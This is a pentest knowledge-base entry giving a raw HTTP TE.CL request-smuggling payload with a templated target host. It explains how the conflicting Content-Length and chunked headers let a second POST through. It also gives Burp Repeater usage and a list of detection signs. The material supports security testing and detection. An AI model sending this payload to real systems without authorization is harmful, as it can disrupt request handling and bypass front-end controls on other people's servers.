---
type: code
language: http
verified: true
created_at: '2020-08-12T03:25:11.775187+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Web
tags:
  - http-request-smuggling
  - payload
  - web
validated: true
---

# HTTP-Smuggling-TE-CL-Request

## Code

```http
POST / HTTP/1.1
Host: $_TARGET_HOST
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1 
0
```

## Description

This raw HTTP request snippet implements a TE.CL request smuggling payload. The conflicting Content-Length: 4 and Transfer-Encoding: chunked headers cause the front-end to truncate the body early, while the back-end processes the full chunked data as a smuggled POST request to /404. The '5e' hex chunk (94 bytes) encapsulates the second request, demonstrating vulnerability through differential parsing.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_TARGET_HOST | The hostname of the vulnerable web application | your-lab-id.web-security-academy.net |

## Usage

Copy this snippet into Burp Suite Repeater or a similar tool for sending. It is typically used in web pentesting to test for request smuggling vulnerabilities in applications behind proxies. Combine with [[commands/curl-http-smuggling-te-cl]] for command-line execution or embed in procedures like [[procedures/HTTP-Request-Smuggling-TE-CL-Through-Differential-Response]] for full attack workflows.

## Detection

- WAF or proxy logs showing requests with both TE: chunked and CL headers.
- Anomalous body content with embedded HTTP requests (e.g., multiple 'POST' methods).
- Differential responses: 400/404 mismatches or cache hits on smuggled paths.
- Network traffic analysis for chunk sizes not matching declared CL.

## Related

- [[procedures/HTTP-Request-Smuggling-TE-CL-Through-Differential-Response]]
- [[tools/Burp-Suite]]
